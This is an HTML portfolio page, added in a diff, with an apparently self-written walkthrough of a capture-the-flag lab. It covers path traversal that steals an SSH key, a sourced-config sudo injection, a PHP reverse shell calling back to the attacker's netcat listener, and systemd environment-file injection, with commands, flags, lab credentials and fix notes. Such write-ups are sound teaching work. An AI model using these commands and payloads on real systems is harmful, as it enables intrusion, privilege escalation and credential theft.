@@ -1,0 +1,230 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Ferrow Dynamics Walkthrough | Ahmed Vasil</title>
+  <meta name="description" content="Ferrow Dynamics full compromise walkthrough — LFI steals an SSH key to root, and a web shell rides a systemd timer to root. Two kill chains, four flags.">
+  <link rel="canonical" href="https://vasilahmed744.github.io/Ahmed-Vasil-Portfolio/walkthrough-ferrow-dynamics.html">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&amp;family=IBM+Plex+Serif:ital,wght@0,500;0,600;0,700;1,500&amp;display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+<header class="topbar">
+  <div class="wrap topbar-inner">
+    <a class="brand" href="index.html"><span class="brand-mark">AV</span><span><span class="brand-name">Ahmed Vasil</span><br><span class="brand-role">Aspiring Penetration Tester</span></span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="index.html">Home</a>
+      <a href="about.html">About</a>
+      <a href="projects.html">Projects</a>
+      <a href="skills.html">Skills</a>
+      <a href="journey.html">Journey</a>
+      <a href="walkthroughs.html" class="active">Walkthroughs</a>
+      <a href="contact.html" class="nav-cta">Contact</a>
+    </nav>
+  </div>
+</header>
+<main>
+  <div class="wrap">
+    <div class="page-head anim d1">
+      <span class="eyebrow"><span class="section-no">06</span>Walkthroughs · TryHackMe Room</span>
+      <div class="gold-rule"></div>
+      <h1>Ferrow Dynamics — Full Compromise Walkthrough</h1>
+      <p class="lede">Deep-dive write-up of a self-authored TryHackMe-style room: two independent attack paths, four flags, and one repeated bug class — a root process trusting attacker-controlled text as code.</p>
+    </div>
+    <section class="block wt-content">
+      <table class="info-table anim d2">
+        <tr><th>Target</th><td>192.168.118.131 (thm-ctf)</td></tr>
+        <tr><th>Services</th><td>22/tcp SSH · 80/tcp Apache/PHP · 8000/tcp Python BaseHTTPServer</td></tr>
+        <tr><th>Path 1</th><td>LFI → SSH key → sudo/source injection (root)</td></tr>
+        <tr><th>Path 2</th><td>Web shell → group-readable flag → systemd timer env injection (root)</td></tr>
+        <tr><th>Flags</th><td>4 total — user.txt (rvoss), root.txt, fieldops user.txt, final-root.txt</td></tr>
+      </table>
+      <div class="note anim d2"><strong>Scope note.</strong> This walkthrough documents an authorized CTF lab environment. The lab IP in this session was 192.168.118.131 — live room IPs vary per deployment, so use your own target's address. Use the techniques only on systems you own or are explicitly authorized to test.</div>
+
+      <h2 class="anim d2">Flags at a glance</h2>
+      <table class="wt-table anim d2">
+        <tr><th>#</th><th>Flag file</th><th>Value</th><th>Foothold used</th></tr>
+        <tr><td>1</td><td>rvoss user.txt</td><td><code>THM{0da106211f2253eaf4f642393b07e129}</code></td><td>LFI path traversal</td></tr>
+        <tr><td>2</td><td>root.txt</td><td><code>THM{1ae6b733f8d88bf704760a3c5aba1cdf}</code></td><td>sudo source injection</td></tr>
+        <tr><td>3</td><td>fieldops user.txt</td><td><code>THM{1bbd9bb39a9691604cf9c3412c06710f}</code></td><td>www-data web shell</td></tr>
+        <tr><td>4</td><td>final-root.txt</td><td><code>THM{685fa66fd983a714e4d4bc8afad99f72}</code></td><td>systemd env injection</td></tr>
+      </table>
+
+      <h2 class="anim d2">Phase 1 — Reconnaissance</h2>
+      <h3>1.1 Full TCP port scan</h3>
+      <pre class="code"><code>nmap -sC -sV -p- 192.168.118.131</code></pre>
+      <pre class="code"><code>PORT     STATE SERVICE VERSION
+22/tcp   open ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.16
+80/tcp   open http     Apache httpd 2.4.52 ((Ubuntu))   -&gt; "Ferrow Dynamics"
+8000/tcp open http     BaseHTTPServer 0.6 (Python 3.10) -&gt; "Ferrow Engineering Portal"</code></pre>
+      <p>Three services, two of them HTTP. The <code class="inline">-p-</code> flag matters here — a default top-1000 scan would still have caught 8000, but on a real assessment always run the full range first; services deliberately placed on high ports are a common way boxes (and real internal hosts) hide an "internal-only" admin panel. Two web servers on different ports/stacks (Apache/PHP vs. a bare Python BaseHTTPServer) is a strong signal that the two apps were written independently and may trust each other — worth treating as two separate attack surfaces rather than one.</p>
+
+      <h3>1.2 Directory / content discovery</h3>
+      <pre class="code"><code>gobuster dir -u http://192.168.118.131 -w /usr/share/wordlists/dirb/common.txt</code></pre>
+      <pre class="code"><code>.htpasswd     403       admin.php     302 -&gt; /login.php
+assets        301       includes      301
+index.php     200       uploads       301
+server-status 403</code></pre>
+      <p>gobuster only checks the wordlist against raw paths, so it missed the .php pages that don't collide with common.txt entries. Following up with feroxbuster (which recurses and extracts links from returned HTML) filled in the gaps:</p>
+      <pre class="code"><code>feroxbuster -u http://192.168.118.131 -w /usr/share/wordlists/dirb/common.txt</code></pre>
+      <pre class="code"><code>200   documents.php
+200   login.php
+200   team.php
+302   admin.php        -&gt; /login.php
+200   index.php
+200   assets/style.css</code></pre>
+      <div class="note"><strong>Lesson for your own recon habit.</strong> gobuster with a static wordlist and feroxbuster with link-extraction + recursion are complementary, not redundant. Running only one of them would have hidden either admin.php's redirect chain or the extra .php pages here. Also worth noting: none of these tools found engineering-preview.php — it wasn't linked anywhere discoverable by wordlist, it only surfaced from a hint left in the site's own content (see 2.1). That's a deliberate reminder that automated enumeration has to be paired with actually reading every page you find.</div>
+
+      <h2>Phase 2 — Path 1: LFI / Path Traversal → SSH Key Theft</h2>
+      <h3>2.1 Finding the vulnerable parameter</h3>
+      <p>The homepage's "Engineering" card pointed at a legacy engineering preview endpoint that takes a file query parameter and echoes the named file back inside a <code class="inline">&lt;pre&gt;</code> block:</p>
+      <pre class="code"><code>curl -sS 'http://192.168.118.131/engineering-preview.php?file=q3-engineering-brief.txt'</code></pre>
+      <pre class="code"><code>...
+&lt;h1&gt;q3-engineering-brief.txt&lt;/h1&gt;
+&lt;pre class="preview"&gt;
+Ferrow Dynamics Engineering Brief — Q3
+Renata Voss, DevOps Engineer, is coordinating the legacy access review.
+The legacy preview endpoint is retained for compatibility with engineering records.
+&lt;/pre&gt;</code></pre>
+      <p>This is a textbook Local File Inclusion / arbitrary file read pattern: a developer-facing "preview" feature that reads whatever filename it's given, with no check that the name stays inside an intended documents folder. The brief itself is planted flavor text, but it does real work narratively — it names Renata Voss (rvoss) as the DevOps engineer responsible for "legacy access", which is the cue to go looking for an rvoss credential somewhere reachable from this same endpoint.</p>
+
+      <h3>2.2 Escalating the read to path traversal</h3>
+      <p>Because the parameter is passed straight into a filesystem read with no basename() / allow-list check, a relative path with <code class="inline">../</code> sequences walks back out of the documents directory:</p>
+      <pre class="code"><code>curl -sS 'http://192.168.118.131/engineering-preview.php?file=../engineering-access/rvoss_id_ed25519' \
+  -o rvoss_id_ed25519
+
+chmod 600 rvoss_id_ed25519</code></pre>
+      <p>The chmod 600 isn't optional flavor — OpenSSH refuses to use a private key file that's group- or world-readable ('UNPROTECTED PRIVATE KEY FILE' warning), so any downloaded key has to have its permissions tightened before <code class="inline">ssh -i</code> will even attempt to use it.</p>
+      <div class="note"><strong>Root cause.</strong> The fix is never "reject ../" with a string filter — that's trivially bypassed (URL-encoding, double-encoding, absolute paths). The correct fix is to resolve the requested path with realpath() and verify it's still a descendant of the intended base directory before opening it, or better, map filenames to an internal allow-list/ID rather than touching the filesystem with user input at all.</div>
+
+      <h3>2.3 Initial shell as rvoss</h3>
+      <pre class="code"><code>ssh -i rvoss_id_ed25519 rvoss@192.168.118.131
+$ id
+uid=1000(rvoss) gid=1000(rvoss) groups=1000(rvoss)
+$ cat user.txt
+THM{0da106211f2253eaf4f642393b07e129}</code></pre>
+      <div class="flag-callout"><span class="flag-label">Flag 1 — rvoss user.txt</span><code>THM{0da106211f2253eaf4f642393b07e129}</code></div>
+
+      <h2>Phase 3 — Path 1 Privilege Escalation: sudo + Writable Sourced Config</h2>
+      <h3>3.1 The sudo rule</h3>
+      <pre class="code"><code>sudo -l
+User rvoss may run the following commands on afcc167fe8bc:
+    (root) NOPASSWD: /usr/local/bin/ferrow-log-review
+
+cat /usr/local/bin/ferrow-log-review
+#!/bin/bash
+set -euo pipefail
+source /opt/ferrow/review/log-review.conf
+printf 'Ferrow log review: %s\n' "${LOG_LABEL:-unlabelled}"
+
+ls -ld /opt/ferrow/review
+drwxrwxr-x 1 root rvoss 4096 ... /opt/ferrow/review
+ls -l /opt/ferrow/review/log-review.conf
+-rw-rw-r-- 1 root rvoss 40 ... log-review.conf</code></pre>
+      <p>This is the classic "root script sources a file you can write" pattern, and it's worth understanding exactly why it works rather than just replaying the payload. sudo grants rvoss permission to execute <code class="inline">/usr/local/bin/ferrow-log-review</code> as root. That script itself is owned by root and rvoss can't edit it — but the first thing it does is source a config file that lives in a directory rvoss's group (rvoss, via the shared group on <code class="inline">/opt/ferrow/review</code>) has write access to. source (a.k.a. the <code class="inline">.</code> builtin) doesn't execute the file as a separate program — it reads it line-by-line into the current shell. Since the current shell is running as root (because it was invoked via sudo), anything that looks like a shell command inside that config file runs with root's privileges, not rvoss's.</p>
+
+      <h3>3.2 The payload — command substitution, not just a string</h3>
+      <p>A plain <code class="inline">LOG_LABEL="..."</code> assignment is just data. But bash performs command substitution during variable assignment: <code class="inline">$(...)</code> inside a double-quoted value is executed and its output is substituted in, before the assignment completes. So instead of setting a label string, the config file was rewritten to run an arbitrary command and stash its output in the variable:</p>
+      <pre class="code"><code>printf 'LOG_LABEL=$(cat /root/root.txt)\n' &gt; /opt/ferrow/review/log-review.conf
+sudo /usr/local/bin/ferrow-log-review
+
+Ferrow log review: THM{1ae6b733f8d88bf704760a3c5aba1cdf}</code></pre>
+      <div class="flag-callout"><span class="flag-label">Flag 2 — root.txt (via LOG_LABEL injection)</span><code>THM{1ae6b733f8d88bf704760a3c5aba1cdf}</code></div>
+      <p>The same trick was reused to read a second file that wasn't world-readable — an operations credential file only root could open directly:</p>
+      <pre class="code"><code>printf 'LOG_LABEL=$(cat /root/web-operations-credentials.txt)\n' \
+  &gt; /opt/ferrow/review/log-review.conf
+sudo /usr/local/bin/ferrow-log-review
+
+Ferrow log review: Username: ops_review
+Password: Harbor-Shift-26!</code></pre>
+      <p>The ops_review / Harbor-Shift-26! credential is what opens the operations panel used in Path 2.</p>
+      <div class="note"><strong>Watch the quoting.</strong> The two failed attempts before this succeeded are worth noting for your own habits: both broke because the terminal wrapped the printf '...' string across a line and the shell then treated the wrapped part as a second, unquoted command (bash: syntax error near unexpected token `newline'). Not a technique failure — a copy/paste + terminal-width quoting hazard. When a multi-line payload matters, write it to a small script file first (vi payload.sh) instead of composing it inline, especially over a narrow terminal or a reverse shell where line wrapping is unpredictable.</div>
+      <div class="note"><strong>Root cause.</strong> Never grant a directory-write to the same principal (user or shared group) whose sudo rule sources a file from that directory. If a config really must be externally editable, the privileged script should read it as inert data (e.g. grep '^KEY=' file | cut -d= -f2) rather than source-ing it — source/. is functionally equivalent to eval on the whole file.</div>
+
+      <h2>Phase 4 — Path 2: Web Shell Foothold → www-data</h2>
+      <h3>4.1 Landing the shell</h3>
+      <p>The second path uses the classic pentestmonkey php-reverse-shell.php (IP/port edited to the attacker box, 192.168.179.71:4444), an authenticated file-upload point on the site, and a netcat listener:</p>
+      <pre class="code"><code>nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.118.128] from (UNKNOWN) [192.168.118.131] 40310
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+      <div class="note"><strong>Honest gap in this write-up.</strong> The pasted session doesn't include the upload/trigger request itself — only the listener catching the callback. Since the room's own brief advertises 'authenticated operations staff can submit maintenance attachments' and the earlier LOG_LABEL trick surfaced the ops_review / Harbor-Shift-26! credential, the intended chain is: log into the operations panel with those creds, upload the reverse shell through the field-return/attachment form (the same /uploads/ directory feroxbuster flagged in Phase 1), then request the uploaded file to trigger it. That step is stated here as the intended chain — it is not presented as a captured request.</div>
+
+      <h3>4.2 Stabilizing and enumerating</h3>
+      <pre class="code"><code>$ /bin/bash -i
+www-data@thm-ctf:/$ ls /home
+ctfadmin fieldops rvoss
+www-data@thm-ctf:/$ cd fieldops &amp;&amp; cat user.txt
+THM{1bbd9bb39a9691604cf9c3412c06710f}</code></pre>
+      <div class="flag-callout"><span class="flag-label">Flag 3 — fieldops user.txt</span><code>THM{1bbd9bb39a9691604cf9c3412c06710f}</code></div>
+      <p>www-data could read <code class="inline">/home/fieldops/user.txt</code> directly (world-readable or group-accessible) without needing to become the fieldops user — a softer, "lateral flag" step distinct from a full account compromise. <code class="inline">sudo -l</code> as www-data required a TTY and password, so it was a dead end from this shell, which is the expected signal to go hunting for a different privilege boundary instead — in this case scheduled/background execution rather than sudo.</p>
+
+      <h3>4.3 Finding the timer</h3>
+      <pre class="code"><code>systemctl list-timers --all | grep ferrow-field
+ferrow-field-maintenance.timer   ferrow-field-maintenance.service
+
+cat /etc/systemd/system/ferrow-field-maintenance.timer
+[Timer]
+OnBootSec=30s
+OnUnitInactiveSec=30s
+Unit=ferrow-field-maintenance.service
+
+cat /etc/systemd/system/ferrow-field-maintenance.service
+[Service]
+Type=oneshot
+User=root
+Group=root
+ExecStart=/usr/local/libexec/ferrow-field-maintenance
+
+ls -l /usr/local/lib/ferrow-field-maintenance
+-rwx------ 1 root root 395 ...
+
+ls -l /var/lib/ferrow-field/maintenance.env
+-rw-rw-r-- 1 root www-data 56 ... maintenance.env</code></pre>
+      <p>Same underlying bug class as Phase 3, different transport: a root-owned systemd unit runs a script every 30 seconds (OnUnitInactiveSec=30s), and that script's behaviour is driven by an environment file (<code class="inline">/var/lib/ferrow-field/maintenance.env</code>) that's group-writable by www-data. systemd's EnvironmentFile= directive (or the script doing its own source/export of that file — either way the effect is identical) means whatever key/value pairs are in that file get interpreted as shell variables inside a process that Type=oneshot + User=root guarantees runs as root.</p>
+
+      <h3>4.4 The injection</h3>
+      <pre class="code"><code>echo 'FIELD_TASK="cat /root/final-root.txt"' | tee /var/lib/ferrow-field/maintenance.env &gt;/dev/null
+sleep 35
+cat /var/lib/ferrow-field/latest-report.txt
+THM{685fa66fd983a714e4d4bc8afad99f72}</code></pre>
+      <div class="flag-callout"><span class="flag-label">Flag 4 — final-root.txt</span><code>THM{685fa66fd983a714e4d4bc8afad99f72}</code></div>
+      <p>Same command-substitution idea as Phase 3's LOG_LABEL, but the exploitation primitive here is a bit different and worth distinguishing: FIELD_TASK isn't consumed via <code class="inline">$(...)</code> substitution when the file is written — instead the service's own script almost certainly does something like <code class="inline">eval "$FIELD_TASK"</code> or <code class="inline">$FIELD_TASK</code> unquoted, executing whatever command string the variable holds directly. Either mechanism collapses to the same root cause: a value an unprivileged user can set is later treated as executable code by a root-privileged process. The earlier failed attempts (a literal \n inside a multi-line printf ... &gt; redirect) are the same terminal-wrapping quoting trap seen in Phase 3 — switching to <code class="inline">echo '...' | tee</code> as a single unbroken line sidestepped it. The 35-second sleep is simply waiting out the timer's 30-second OnUnitInactiveSec interval so the service fires again and picks up the modified environment file.</p>
+      <div class="note"><strong>Root cause.</strong> Never let an unprivileged-writable file feed values into a root-run process without both (a) a strict allow-list of permitted keys/values, and (b) treating every value as inert data, never as something passed through eval, source, or unquoted expansion. If a systemd service genuinely needs a user-tunable field, validate it in the service's own code with a fixed set of accepted values, not free-form shell text.</div>
+
+      <h2>Summary — Flags &amp; Attack Chains</h2>
+      <table class="wt-table">
+        <tr><th>#</th><th>Flag file</th><th>Value</th><th>Foothold used</th></tr>
+        <tr><td>1</td><td>rvoss user.txt</td><td><code>THM{0da106211f2253eaf4f642393b07e129}</code></td><td>LFI path traversal</td></tr>
+        <tr><td>2</td><td>root.txt</td><td><code>THM{1ae6b733f8d88bf704760a3c5aba1cdf}</code></td><td>sudo source injection</td></tr>
+        <tr><td>3</td><td>fieldops user.txt</td><td><code>THM{1bbd9bb39a9691604cf9c3412c06710f}</code></td><td>www-data web shell</td></tr>
+        <tr><td>4</td><td>final-root.txt</td><td><code>THM{685fa66fd983a714e4d4bc8afad99f72}</code></td><td>systemd env injection</td></tr>
+      </table>
+      <h3>Two independent kill chains, same underlying bug class</h3>
+      <ul>
+        <li><strong>Path 1:</strong> unauthenticated LFI (engineering-preview.php) → SSH private key disclosure → NOPASSWD sudo rule → root-run script sources a group-writable config → command substitution in the sourced value → root.</li>
+        <li><strong>Path 2:</strong> authenticated upload → PHP web shell → www-data → group-writable environment file feeding a root-owned systemd timer → injected command string → root.</li>
+        <li>Both privilege-escalation steps are the same idea wearing a different hat: a root-privileged process consumes attacker-controlled text as if it were trusted code, via source in one case and EnvironmentFile/eval in the other. That repetition is a good teaching point — it shows the same GTFOBins-adjacent pattern ("who can write what a root process later interprets as code") surfacing through two completely different services.</li>
+      </ul>
+      <div class="note"><strong>Open item for a fully complete write-up.</strong> The transition from Phase 1's captured ops_review credential to the Phase 2 www-data shell isn't shown in the pasted terminal history — only the netcat callback is. Re-running the login + upload + trigger sequence and capturing those requests would close that gap.</div>
+      <div class="wt-nav">
+        <a href="walkthroughs.html">← All Walkthroughs</a>
+        <a href="walkthrough-cpt-exam.html">Next: CPT Practical Exam →</a>
+      </div>
+    </section>
+  </div>
+</main>
+<footer>
+  <div class="wrap footer-cta"><a href="contact.html">Work with me →</a></div>
+  <div class="wrap footer-inner">
+    <span class="f-name">Ahmed Vasil</span>
+    <span class="f-role">Aspiring Penetration Tester</span>
+    <span class="footer-links"><a href="https://github.com/vasilahmed744">GitHub</a><a href="https://www.linkedin.com/in/ahamad-vasil-205590386">LinkedIn</a></span>
+  </div>
+  <div class="wrap footer-base"><span>© Ahmed Vasil</span><span>Narasimharajapura, Karnataka, India</span></div>
+</footer>
+</body>
+</html>
